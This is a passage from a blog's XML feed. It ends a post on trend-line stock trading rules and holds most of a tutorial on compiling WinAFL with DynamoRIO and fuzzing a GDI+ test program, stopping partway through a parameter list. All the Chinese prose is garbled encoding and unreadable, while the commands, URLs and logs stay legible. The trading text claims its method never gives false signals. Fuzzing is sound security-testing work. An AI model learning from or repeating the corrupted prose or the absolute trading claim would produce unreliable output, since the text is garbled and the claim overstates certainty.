href="#å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿" class="headerlink" title="å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿"></a>å¦‚ä½•æ­£ç¡®çš„ç»˜åˆ¶è¶‹åŠ¿çº¿</h2><p>ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ç»˜åˆ¶è¶‹åŠ¿çº¿å¯ä»¥æä¾›ä¸€è‡´è€Œç²¾ç¡®çš„ç»“æœï¼Œè€Œä¸”ç»å¯¹ä¸ä¼šäº§ç”Ÿé”™è¯¯çš„ä¿¡å·ï¼š</p><ol><li>é€‰æ‹©è€ƒè™‘çš„æ—¶é—´ï¼šé•¿æœŸï¼ˆæ•°æœˆè‡³æ•°å¹´ï¼‰ã€ä¸­æœŸï¼ˆæ•°ä¸ªæ˜ŸæœŸè‡³æ•°æœˆï¼‰æˆ–çŸ­æœŸï¼ˆæ•°å¤©è‡³æ•°ä¸ªæ˜ŸæœŸï¼‰ã€‚</li><li>ä¸Šå‡è¶‹åŠ¿çº¿ï¼šåœ¨è€ƒè™‘çš„æ—¶é—´å†…ï¼Œä»¥æœ€ä½çš„ä½ç‚¹ä¸ºèµ·ç‚¹ï¼Œå‘å³ä¸Šæ–¹ç»˜åˆ¶ä¸€æ¡ç›´çº¿ï¼Œè¿æ¥æœ€é«˜ç‚¹å‰çš„æŸä¸€ä¸ªä½ç‚¹ï¼Œä½¿è¿™æ¡ç›´çº¿åœ¨ä¸¤ä¸ªä½ç‚¹ä¹‹é—´æœªç©¿è¶Šä»»ä½•ä»·ä½ã€‚å»¶ä¼¸è¿™æ¡ç›´çº¿è€Œç»è¿‡æœ€é«˜ç‚¹ï¼ˆè¿™æ˜¯æŒ‡æ°´å¹³è½´ä¸Šçš„ä½ç½®è€Œè¨€ï¼‰ã€‚è¶‹åŠ¿çº¿ç»è¿‡æ‰€è€ƒè™‘çš„æœ€é«˜ç‚¹ä»¥åï¼Œå®ƒå¯èƒ½ç©¿è¶ŠæŸäº›ä»·ä½ã€‚äº‹å®ä¸Šï¼Œè¿™æ˜¯è¶‹åŠ¿å‘ç”Ÿå˜åŒ–çš„ä¸€ç§ç°è±¡ã€‚</li><li>ä¸‹é™è¶‹åŠ¿çº¿ï¼šåœ¨è€ƒè™‘çš„æ—¶é—´å†…ï¼Œä»¥æœ€é«˜çš„é«˜ç‚¹ä¸ºèµ·ç‚¹ï¼Œå‘å³ä¸‹æ–¹ç»˜åˆ¶ä¸€æ¡ç›´çº¿ï¼Œè¿æ¥æœ€ä½ç‚¹å‰çš„æŸä¸€ä¸ªé«˜ç‚¹ï¼Œè€Œä½¿è¿™æ¡ç›´çº¿åœ¨ä¸¤ä¸ªé«˜ç‚¹ä¹‹é—´æœªç©¿è¶Šä»»ä½•ä»·ä½ã€‚å»¶ä¼¸è¿™æ¡ç›´çº¿è€Œç»è¿‡æœ€ä½ç‚¹ã€‚</li></ol><p>è¿™ä¸ªæ–¹æ³•çš„ä¼˜ç‚¹åœ¨äºå…¶æ˜ç¡®æ€§ï¼Œå¹¶å¯ä»¥ç”¨æ¥åˆ¤æ–­è¶‹åŠ¿æ˜¯å¦å¯èƒ½å˜åŠ¨æˆ–å·²ç»å˜åŠ¨ã€‚</p><h2 id="ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„-123-æ³•åˆ™"><a href="#ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„-123-æ³•åˆ™" class="headerlink" title="ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„ 123 æ³•åˆ™"></a>ç¡®ç«‹è¶‹åŠ¿å˜åŠ¨çš„ 123 æ³•åˆ™</h2><ul><li>è‚¡ä»·çªç ´è¶‹åŠ¿çº¿</li><li>ä¸Šå‡è¶‹åŠ¿å›æ¡£åï¼Œä¸åˆ›æ–°é«˜ï¼›ä¸‹é™è¶‹åŠ¿åå¼¹åï¼Œä¸åˆ›æ–°ä½</li><li>ä¸Šå‡è¶‹åŠ¿è·Œç ´ä¸Šä¸€ä¸ªå›æ¡£ä½ç‚¹ï¼Œä¸‹é™è¶‹åŠ¿çªç ´ä¸Šä¸€ä¸ªåå¼¹é«˜ç‚¹</li></ul><h2 id="é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„-2Bæ³•åˆ™"><a href="#é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„-2Bæ³•åˆ™" class="headerlink" title="é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„ 2Bæ³•åˆ™"></a>é£é™©æŠ¥é…¬æ¯”å¾ˆä¸é”™çš„ 2Bæ³•åˆ™</h2><p>ä¸Šå‡è¶‹åŠ¿ä¸­ä»·æ ¼åˆ›æ–°é«˜åï¼Œå¹¶æœªæŒç»­ä¸Šæ¶¨ï¼Œè€Œååˆè·Œç ´å…ˆå‰çš„é«˜ç‚¹ï¼Œåˆ™è¶‹åŠ¿å¾ˆå¯èƒ½åè½¬ã€‚</p><h2 id="å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™"><a href="#å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™" class="headerlink" title="å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™"></a>å…·æœ‰ç»Ÿè®¡å­¦ä¼˜åŠ¿çš„å››å¤©å‡†åˆ™</h2><p>åœ¨ä¸­æœŸèµ°åŠ¿ä¸­ï¼Œå½“å¸‚åœºåœ¨é«˜ç‚¹æˆ–è€…ä½ç‚¹ä»¥è¿ç»­å››å¤©ä¸‹è·Œæˆ–ä¸Šæ¶¨çš„èµ°åŠ¿è€Œå‘ˆ<strong>åè½¬</strong>æ—¶ï¼Œè¶‹åŠ¿å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ ï¼ˆå’Œè¶‹åŠ¿æ–¹å‘ç›¸åçš„è¿ç»­å››æ ¹Kçº¿ï¼‰</p><h2 id="å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™"><a href="#å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™" class="headerlink" title="å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™"></a>å››å¤©å‡†åˆ™è¾…åŠ©å‡†åˆ™</h2><p>å½“ä¸­æœŸèµ°åŠ¿å‘å±•åˆ°ç›¸å½“ç¨‹åº¦ä»¥åï¼Œå¦‚æœå‡ºç°é¡ºåŠ¿çš„å››å¤©ï¼ˆæˆ–è€…ä»¥ä¸Šï¼‰æ’åˆ—ï¼Œéšåå‡ºç°ç¬¬ä¸€å¤©çš„é€†è¶‹åŠ¿è¡Œæƒ…ï¼Œç»å¸¸ä»£è¡¨è¶‹åŠ¿å˜åŠ¨çš„é¡¶éƒ¨æˆ–è€…åº•éƒ¨ã€‚</p><h2 id="ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™"><a href="#ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™" class="headerlink" title="ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™"></a>ä¸‰å¤©é«˜ä½ä»·å‡†åˆ™</h2><p>ä¸‰å¤©çš„é«˜ä½ä»·å‡†åˆ™ï¼Œæ˜¯è¿ç”¨æœ€è¿‘ä¸‰å¤©çš„ç›˜ä¸­é«˜ä»·ä¸ä½ä»·ã€‚å½“ä»·æ ¼å‘ç”Ÿåè½¬è€Œç©¿è¶Šä¸‰å¤©çš„é«˜ä»·æˆ–ä½ä»·æ—¶ï¼Œåˆ™åšå¤šæˆ–å–ç©ºï¼Œå¹¶ä»¥ç¬¬ä¸‰å¤©çš„ä½ä»·æˆ–é«˜ä»·ä½œä¸ºæ­¢æŸç‚¹ã€‚ <strong>è¿™ä¸ªå‡†åˆ™å¿…é¡»é…åˆå¦ä¸€ä¸ªç¡®è®¤åŸåˆ™ã€‚</strong></p><h2 id="ç¼ºå£å‡†åˆ™"><a href="#ç¼ºå£å‡†åˆ™" class="headerlink" title="ç¼ºå£å‡†åˆ™"></a>ç¼ºå£å‡†åˆ™</h2><p>ç¼ºå£å‡†åˆ™å¾ˆç®€å•ï¼Œå½“è¶‹åŠ¿çº¿ä¸Šæ–¹æˆ–è€…ä¸‹æ–¹å‡ºç°ç¼ºå£æ—¶ï¼Œå®ƒåæ˜ é‡å¤§å˜åŒ–ï¼ˆæ¶ˆæ¯é¢æˆ–åŸºæœ¬é¢ï¼‰ï¼Œå¹¶æ˜¾ç¤ºè¶‹åŠ¿å¯èƒ½å‘ç”Ÿå˜åŠ¨ã€‚è¯¥å‡†åˆ™å¹¶ä¸éœ€è¦2Bï¼Œä¹Ÿä¸éœ€è¦ç»è¿‡è¯•æ¢ï¼ˆè¶‹åŠ¿çº¿ï¼‰ã€‚<br>ç„¶è€Œï¼Œç¼ºå£å¿…é¡»ç©¿è¶Šè¶‹åŠ¿çº¿ï¼Œè¯¥å‡†åˆ™æ‰æœ‰æ•ˆã€‚ <strong>è¿™ä¸ªå‡†åˆ™å¿…é¡»é…åˆå¦ä¸€ä¸ªç¡®è®¤åŸåˆ™ã€‚</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ‰å…³é‡‘èå¸‚åœºæ–¹é¢çš„ä¹¦æˆ‘ä¸ªäººçš„å›¾ä¹¦é¦†é‡Œè‡³å°‘æœ‰1200æœ¬ã€‚å®ƒä»¬ä¸»è¦æ˜¯è®¨è®ºè¯åˆ¸åˆ†æã€æœŸæƒç­–ç•¥ã€æœŸè´§ç­–ç•¥ã€æŠ€æœ¯åˆ†æä»¥åŠå…¶ä»–ç›¸å…³æ–¹é¢çš„ä¹¦ã€‚è¿™äº›ä¹¦å¤§å¤šéƒ½åŒ…å«ç›¸å½“ä¸é”™çš„æ„æƒ³ï¼Œå…¶ä¸­çº¦2%æ˜¯çœŸæ­£ä¼˜ç§€çš„ä½œå“ã€‚ç„¶è€Œï¼Œå®ƒä»¬å¤§å¤šå­˜åœ¨ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼šè¯•å›¾æ¨é”€ä¸€ç§â€œæˆ˜èƒœå¸‚åœºâ€çš„æ–¹æ³•ï¼Œå¾ˆå¤šæ–¹æ³•ç”šè‡³æ²¡æœ‰ç»è¿‡</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>winafl fuzz å·¥å…·çš„ä½¿ç”¨</title>
    <link href="http://usmacd.com/2022/08/23/winafl/"/>
    <id>http://usmacd.com/2022/08/23/winafl/</id>
    <published>2022-08-22T16:00:00.000Z</published>
    <updated>2022-08-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-ä¸‹è½½-Visual-Studio-Community-2022"><a href="#0-ä¸‹è½½-Visual-Studio-Community-2022" class="headerlink" title="0. ä¸‹è½½ Visual Studio Community 2022"></a>0. ä¸‹è½½ Visual Studio Community 2022</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://aka.ms/vs/17/release/vs_community.exe">https://aka.ms/vs/17/release/vs_community.exe</a></p><p>ä»å¾®è½¯ç½‘ç«™ä¸‹è½½å¹¶å®‰è£… Visual Studio Community çš„æ—¶å€™é€Ÿåº¦åªæœ‰2 Kï¼Œä¸€ä¸‹åˆæ²¡èƒ½ä¸‹è½½æˆåŠŸã€‚å’¨è¯¢åŒäº‹å°é’»é£ï¼ŒæŒ‡å‡ºå¯èƒ½æ˜¯ DNS é—®é¢˜ï¼Œå°† DNS åˆ‡æ¢æˆé˜¿é‡Œçš„ DNS 223.5.5.5 åä¸‹è½½é€Ÿåº¦è¾¾åˆ° 4 Mã€‚ä¸­å›½å¼€å‘è€…ç½‘ç»œæ€»æ˜¯ä¸ªé—®é¢˜ï¼Œå¤§å®¶éƒ½æŒºä¸å®¹æ˜“çš„ã€‚</p><h2 id="1-ç¼–è¯‘-winafl"><a href="#1-ç¼–è¯‘-winafl" class="headerlink" title="1. ç¼–è¯‘ winafl"></a>1. ç¼–è¯‘ winafl</h2><ol><li>ä¸‹è½½ DynamoRIOï¼Œ<a href="https://github.com/DynamoRIO/dynamorio/releases/download/cronbuild-9.0.19209/DynamoRIO-Windows-9.0.19209.zip">https://github.com/DynamoRIO/dynamorio/releases/download/cronbuild-9.0.19209/DynamoRIO-Windows-9.0.19209.zip</a> è§£å‹åˆ° D:\DynamoRIO</li><li>ä¸‹è½½ cmakeï¼Œ<a href="https://github.com/Kitware/CMake/releases/download/v3.24.0/cmake-3.24.0-windows-x86_64.zip">https://github.com/Kitware/CMake/releases/download/v3.24.0/cmake-3.24.0-windows-x86_64.zip</a> è§£å‹åˆ° D:\cmake</li><li>ä» Github ä¸‹è½½ winafl æºç  <a href="https://github.com/googleprojectzero/winafl.git">https://github.com/googleprojectzero/winafl.git</a>  ï¼Œ ç¼–è¯‘ intel PT éœ€è¦åŒæ­¥ third_party çš„æºç </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/googleprojectzero/winafl.git</span><br><span class="line"><span class="built_in">cd</span> winafl</span><br><span class="line">git submodule update --init --recursive</span><br></pre></td></tr></table></figure><ol start="4"><li>ä»èœå•ä¸­é€‰æ‹©  <code>X64 native tool command prompt for VS 2022</code>ï¼Œæ‰§è¡Œç¼–è¯‘å‘½ä»¤</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build64</span><br><span class="line">cd build64</span><br><span class="line">D:\cmake\bin\cmake.exe -G&quot;Visual Studio 17 2022&quot; -A x64 .. -DDynamoRIO_DIR=D:\DynamoRIO\cmake -DINTELPT=1</span><br><span class="line">D:\cmake\cmake.exe --build . --config Release</span><br></pre></td></tr></table></figure><p><code>-DINTelPT=1</code>  å‚æ•°å°†ç¼–è¯‘ Intel PT æ¨¡å¼çš„æ”¯æŒï¼Œç¼–è¯‘å®Œæˆåï¼Œå¯ä»¥æ­£å¸¸è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.\build64\bin\Release&gt;.\afl-fuzz.exe</span><br><span class="line"></span><br><span class="line">WinAFL 1.16b by &lt;ifratric@google.com&gt;</span><br><span class="line">Based on AFL 2.43b by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">.\afl-fuzz.exe [ afl options ] -- [instrumentation options] -- \path\to\fuzzed_app [ ... ]</span><br><span class="line"></span><br><span class="line">Required parameters:</span><br><span class="line"></span><br><span class="line">  -i dir        - input directory with test cases</span><br><span class="line">  -o dir        - output directory for fuzzer findings</span><br><span class="line">  -t msec       - timeout for each run</span><br><span class="line"></span><br><span class="line">Instrumentation type:</span><br><span class="line"></span><br><span class="line">  -D dir       - directory with DynamoRIO binaries (drrun, drconfig)</span><br><span class="line">  -w winafl    - Path to winafl.dll</span><br><span class="line">  -P           - use Intel PT tracing mode</span><br><span class="line">  -Y           - enable the static instrumentation mode</span><br><span class="line"></span><br><span class="line">Execution control settings:</span><br><span class="line"></span><br><span class="line">  -f file       - location read by the fuzzed program (stdin)</span><br><span class="line">  -m limit      - memory limit for the target process</span><br><span class="line">  -p            - persist DynamoRIO cache across target process restarts</span><br><span class="line">  -c cpu        - the CPU to run the fuzzed program</span><br><span class="line"></span><br><span class="line">Fuzzing behavior settings:</span><br><span class="line"></span><br><span class="line">  -d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">  -n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">  -x dir        - optional fuzzer dictionary (see README)</span><br><span class="line"></span><br><span class="line">Other stuff:</span><br><span class="line"></span><br><span class="line">  -I msec       - timeout for process initialization and first run</span><br><span class="line">  -T text       - text banner to show on the screen</span><br><span class="line">  -M \ -S id   - distributed mode (see parallel_fuzzing.txt)</span><br><span class="line">  -C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">  -e            - expert mode to run WinAFL as a DynamoRIO tool</span><br><span class="line">  -l path       - a path to user-defined DLL for custom test cases processing</span><br><span class="line">  -V            - show version number and exit</span><br><span class="line"></span><br><span class="line">Attach:</span><br><span class="line"></span><br><span class="line">  -A module     - attach to the process that loaded the provided module</span><br><span class="line"></span><br><span class="line">For additional tips, please consult afl_docs\README.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\zhouzhen\Downloads\winafl\build64\bin\Release&gt;</span><br></pre></td></tr></table></figure><h2 id="2-æ£€æŸ¥-DynamoRIO-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"><a href="#2-æ£€æŸ¥-DynamoRIO-æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ" class="headerlink" title="2. æ£€æŸ¥ DynamoRIO æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ"></a>2. æ£€æŸ¥ DynamoRIO æ¨¡å¼æ˜¯å¦æ­£å¸¸å·¥ä½œ</h2><p>ä½¿ç”¨ IDA Pro å¯¹ test_gdiplus.exe è¿›è¡Œåæ±‡ç¼–ï¼Œtarget_offset ä¸º <code>0x10E0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000001400010E0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000001400010E0 main            proc near               ; CODE XREF: __scrt_common_main_seh(void)+107â†“p</span><br><span class="line">.text:00000001400010E0                                         ; DATA XREF: .rdata:0000000140002B6Câ†“o ...</span><br></pre></td></tr></table></figure><p>å…ˆç”¨ drrun.exe æµ‹è¯• winafl æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œå…¶å®å°±æ˜¯å¾ªç¯æ‰§è¡Œ 10 æ¬¡ç›®æ ‡ç¨‹åºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\DynamoRIO\bin64\drrun.exe -c winafl.dll -debug ^</span><br><span class="line">-target_module test_gdiplus.exe -target_offset 0x10E0 -fuzz_iterations 10 ^</span><br><span class="line">-nargs 2 -- test_gdiplus.exe input.bmp</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤åï¼Œåœ¨å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª log æ–‡ä»¶ï¼Œæ–‡ä»¶åä¸º <code>afl.test_gdiplus.exe.14172.0000.proc.log</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Module loaded, dynamorio.dll</span><br><span class="line">Module loaded, winafl.dll</span><br><span class="line">Module loaded, drx.dll</span><br><span class="line">Module loaded, drreg.dll</span><br><span class="line">Module loaded, drmgr.dll</span><br><span class="line">Module loaded, drwrap.dll</span><br><span class="line">Module loaded, test_gdiplus.exe</span><br><span class="line">Module loaded, gdiplus.dll</span><br><span class="line">Module loaded, VCRUNTIME140.dll</span><br><span class="line">Module loaded, msvcp_win.dll</span><br><span class="line">Module loaded, win32u.dll</span><br><span class="line">Module loaded, ucrtbase.dll</span><br><span class="line">Module loaded, KERNELBASE.dll</span><br><span class="line">Module loaded, gdi32full.dll</span><br><span class="line">Module loaded, KERNEL32.dll</span><br><span class="line">Module loaded, msvcrt.dll</span><br><span class="line">Module loaded, IMM32.dll</span><br><span class="line">Module loaded, RPCRT4.dll</span><br><span class="line">Module loaded, GDI32.dll</span><br><span class="line">Module loaded, combase.dll</span><br><span class="line">Module loaded, USER32.dll</span><br><span class="line">Module loaded, ntdll.dll</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">Module loaded, UxTheme.dll</span><br><span class="line">Module loaded, OLEAUT32.dll</span><br><span class="line">Module loaded, bcrypt.dll</span><br><span class="line">Module loaded, SECHOST.dll</span><br><span class="line">Module loaded, ADVAPI32.dll</span><br><span class="line">Module loaded, WindowsCodecs.dll</span><br><span class="line">Module loaded, MSCTF.dll</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">In pre_fuzz_handler</span><br><span class="line">In post_fuzz_handler</span><br><span class="line">Everything appears to be running normally.</span><br><span class="line">Coverage map follows:</span><br><span class="line">                                            </span><br></pre></td></tr></table></figure><p><code>Everything appears to be running normally.</code> è¡¨æ˜ winafl è‡ªå·±è®¤ä¸ºæ²¡æœ‰å‡ºé”™ã€‚ log æ–‡ä»¶ä¸­è¿˜åŒ…å«äº†å…¶ä»–æœ‰ç”¨ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ç›®æ ‡ç¨‹åºåŠ è½½çš„æ¨¡å—ã€‚è¿™äº›åŠ è½½çš„æ¨¡å—å¯ä»¥ç”¨æ¥è®¾ç½® <code>-coverage_module</code>æ¥ç»Ÿè®¡ä½ æ‰€å…³æ³¨çš„ coverageã€‚</p><p>ä½¿ç”¨ drrun.exe éªŒè¯æˆåŠŸåï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤æµ‹è¯• winafl æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd &gt; afl-fuzz.exe -i <span class="keyword">in</span> -o out -D D:\DynamoRIO\bin64 -t 20000 ^</span><br><span class="line">-- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^</span><br><span class="line">-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåä¸Šé¢çš„å‘½ä»¤åï¼Œå¦‚æœå‘ç° total paths çš„æ•°å­—åœ¨ä¸æ–­å˜åŒ–ï¼Œ winafl å°±å·²ç»å¯ä»¥æ­£å¸¸å·¥ä½œäº†ï¼Œæ­å–œ ğŸ˜„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">+- process timing -------------------------------------+- overall results ----+</span><br><span class="line">|        run time : 0 days, 0 hrs, 0 min, 1 sec        |  cycles done : 0     |</span><br><span class="line">|   last new path : 0 days, 0 hrs, 0 min, 1 sec        |  total paths : 2     |</span><br><span class="line">| last uniq crash : none seen yet                      | uniq crashes : 0     |</span><br><span class="line">|  last uniq hang : none seen yet                      |   uniq hangs : 0     |</span><br><span class="line">+- cycle progress --------------------+- map coverage -+----------------------+</span><br><span class="line">|  now processing : 0 (0.00%)         |    map density : 1.65% / 1.65%        |</span><br><span class="line">| paths timed out : 0 (0.00%)         | count coverage : 1.00 bits/tuple      |</span><br><span class="line">+- stage progress --------------------+ findings in depth --------------------+</span><br><span class="line">|  now trying : arith 8\8             | favored paths : 1 (50.00%)            |</span><br><span class="line">| stage execs : 388/389 (99.74%)      |  new edges on : 2 (100.00%)           |</span><br><span class="line">| total execs : 619                   | total crashes : 0 (0 unique)          |</span><br><span class="line">|  exec speed : 353.3/sec             |  total tmouts : 0 (0 unique)          |</span><br><span class="line">+- fuzzing strategy yields -----------+---------------+- path geometry -------+</span><br><span class="line">|   bit flips : 0/56, 1/55, 0/53                      |    levels : 2         |</span><br><span class="line">|  byte flips : 0/7, 0/6, 0/4                         |   pending : 2         |</span><br><span class="line">| arithmetics : 0/0, 0/0, 0/0                         |  pend fav : 1         |</span><br><span class="line">|  known ints : 0/0, 0/0, 0/0                         | own finds : 1         |</span><br><span class="line">|  dictionary : 0/0, 0/0, 0/0                         |  imported : n/a       |</span><br><span class="line">|       havoc : 0/0, 0/0                              | stability : 99.63%    |</span><br><span class="line">|        trim : 0.00%/1, 0.00%                        +-----------------------+</span><br><span class="line">^C----------------------------------------------------+   [cpu000001:  14%]</span><br></pre></td></tr></table></figure><h2 id="3-DynamoRIO-æ¨¡å¼-winafl-dll-å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰"><a href="#3-DynamoRIO-æ¨¡å¼-winafl-dll-å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰" class="headerlink" title="3. DynamoRIO æ¨¡å¼ winafl.dll å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰"></a>3. DynamoRIO æ¨¡å¼ winafl.dll å„ä¸ªå‚æ•°çš„å…·ä½“å«ä¹‰</h2><p>winafl.dll æ˜¯ DynamoRIO client (instrumentation) codeï¼Œå‚æ•°æŒºå¤š Winafl çš„ README ä¸­ä»‹ç»äº†ä¸‹é¢è¿™äº›å‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">-covtype         - the type of coverage being recorded. Supported options are</span><br><span class="line">                   bb (basic block, default) or edge.</span><br><span class="line"></span><br><span class="line">-coverage_module - module for which to record coverage. Multiple module flags</span><br><span class="line">                   are supported.</span><br><span class="line"></span><br><span class="line">-target_module   - module which contains the target function to be fuzzed.</span><br><span class="line">                   Either -target_method or -target_offset need to be</span><br><span class="line">                   specified together with this option.</span><br><span class="line"></span><br><span 